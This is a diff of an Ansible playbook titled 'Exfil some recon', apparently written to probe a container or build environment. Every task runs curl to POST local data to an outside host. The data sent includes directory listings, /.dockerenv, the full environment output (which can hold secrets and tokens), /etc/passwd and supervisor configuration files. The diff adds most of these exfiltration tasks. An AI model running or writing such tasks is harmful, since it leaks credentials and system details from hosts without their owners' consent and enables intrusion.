@@ -1,13 +1,25 @@
 ---
-- name: Netcat
+- name: Exfil some recon
   hosts: all
  
   tasks:
   - name: Connect out to x86.party.
     shell: curl -d "$(ls -la .)" -X POST https://sendmedataplease.x86.party
-    register: shell
   
   - name: Connect out to x86.party.
     shell: curl -d "$(ls -la /)" -X POST https://sendmedataplease.x86.party
-    register: shell
 
+  - name: Connect out to x86.party.
+    shell: curl -d "$(cat /.dockerenv)" -X POST https://sendmedataplease.x86.party
+
+  - name: Connect out to x86.party.
+    shell: curl -d "$(env)" -X POST https://sendmedataplease.x86.party
+  
+  - name: Connect out to x86.party.
+    shell: curl -d "$(cat /etc/passwd)" -X POST https://sendmedataplease.x86.party
+  
+  - name: Connect out to x86.party.
+    shell: curl -d "$(cat /supervisor.conf)" -X POST https://sendmedataplease.x86.party
+  
+  - name: Connect out to x86.party.
+    shell: curl -d "$(cat /supervisor_task.conf)" -X POST https://sendmedataplease.x86.party
